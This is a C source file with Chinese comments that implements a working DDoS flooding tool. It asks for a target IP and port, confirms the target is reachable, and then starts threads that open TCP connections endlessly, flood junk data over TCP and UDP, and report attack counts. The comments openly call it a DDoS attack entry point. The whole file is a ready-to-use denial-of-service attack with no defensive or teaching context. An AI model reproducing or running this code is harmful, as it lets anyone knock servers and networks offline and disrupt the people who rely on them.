#include <scsocket.h>

#define _INT_HOST   (255)	
#define _INT_TOUT   (3000)

struct targ {
    sockaddr_t addr;
    char ts[BUFSIZ];
    char us[BUFSIZ];

    // 攻击次数统计
    uint64_t connect;
    uint64_t tcpsend;
    uint64_t udpsend;
};

// 得到玩家输入的地址信息
void addr_input(sockaddr_t * addr);

// 检查IP是否合法
bool addr_check(sockaddr_t * addr);

// 目前启动3个类型线程, 2个是connect, 2个是connect + send 2个是 udp send
void ddos_run(struct targ * arg);

//
// ddos attack entrance
//
void test_scsocket(void) {
    // 记录详细攻击的量, ts and us 是脏数据随便发
    struct targ arg;
    arg.udpsend = arg.tcpsend = arg.connect = 0;

    // 得到玩家的地址信息
    addr_input(&arg.addr);

    if (!addr_check(&arg.addr))
	    EXIT("ip or port check is error!!!");

    // 开始要启动线程了
    ddos_run(&arg);

    // :> 开始统计数据
    puts("connect count		tcp send count			udp send count");
    for (;;) {
	    printf(" %"PRIu64"			 %"PRIu64"				 %"PRIu64"\n"
            , arg.connect, arg.tcpsend, arg.udpsend);
	    sh_msleep(_INT_TOUT);
    }
}

// 得到玩家输入的地址信息
void
addr_input(sockaddr_t * addr) {
    bool flag = true;
    int rt = 0;
    uint16_t port;
    char ip[_INT_HOST + 1] = { 0 };

    puts("Please input ip and port, example :> 127.0.0.1 8088");
    printf(":> ");

    // 自己重构scanf, 解决注入漏洞
    while (rt < _INT_HOST) {
	    char c = getchar();
	    if (isspace(c)) {
		    if (flag)
			    continue;
		    break;
	    }
	    flag = false;
	    ip[rt++] = c;
    }
    ip[rt] = '\0';

    rt = scanf("%hu", &port);
    if (rt != 1)
	    EXIT("scanf_s addr->host = %s, port = %hu.", ip, port);

    printf("connect check input addr ip:port = %s:%hu.\n", ip, port);

    // 下面就是待验证的地址信息
    if (socket_addr(ip, port, addr) < SufBase)
	    EXIT("socket_addr ip , port is error = %s, %hu.", ip, port);
}

// 检查IP是否合法
bool
addr_check(sockaddr_t * addr) {
    int r;
    socket_t s = socket_stream();
    if (s == INVALID_SOCKET) {
	    RETURN(false, "socket_stream is error!!");
    }

    r = socket_connecto(s, addr, _INT_TOUT);
    socket_close(s);
    if (r < SufBase) {
	    RETURN(false, "socket_connecto addr is timeout = %d.", _INT_TOUT);
    }

    return true;
}

// connect 链接
static void _connect(struct targ * targ) {
    // 疯狂connect
    for (;;) {
	    socket_t s = socket_stream();
	    if (s == INVALID_SOCKET) {
		    CERR("socket_stream is error!");
		    continue;
	    }

	    // 精确统计, 一定要连接成功
	    while (socket_connect(s, &targ->addr) < SufBase)
		    ;

	    ++targ->connect;
	    socket_close(s);
    }
}

// connect + send 连接
static void _tcpsend(struct targ * targ) {
    // 疯狂connect
    for (;;) {
	    socket_t s = socket_stream();
	    if (s == INVALID_SOCKET) {
		    CERR("socket_stream is error!");
		    continue;
	    }

	    // 精确统计, 一定要连接成功
	    while (socket_connect(s, &targ->addr) < SufBase)
		    ;

	    // 疯狂发送数据包
	    while (socket_send(s, targ->ts, BUFSIZ) >= SufBase)
		    ++targ->tcpsend;

	    socket_close(s);
    }
}

// udp send 连接
static void _udpsend(struct targ * targ) {
    for (;;) {
	    socket_t s = socket_dgram();
	    if (s == INVALID_SOCKET) {
		    CERR("socket_stream is error!");
		    continue;
	    }

	    // 疯狂发送数据包
	    while (socket_sendto(s, targ->us, BUFSIZ, 0, &targ->addr) >= SufBase)
		    ++targ->udpsend;

	    socket_close(s);
    }
}

// 目前启动3个类型线程, 2个是connect, 2个是connect + send 2个是 udp send
void
ddos_run(struct targ * arg) {
    // 创建两个 connect 线程
    IF(async_run(_connect, arg) < 0);
    IF(async_run(_connect, arg) < 0);

    // 创建两个 connect + send 线程
    IF(async_run(_tcpsend, arg) < 0);
    IF(async_run(_tcpsend, arg) < 0);

    // 创建两个 udp send 线程
    IF(async_run(_udpsend, arg) < 0);
    IF(async_run(_udpsend, arg) < 0);
}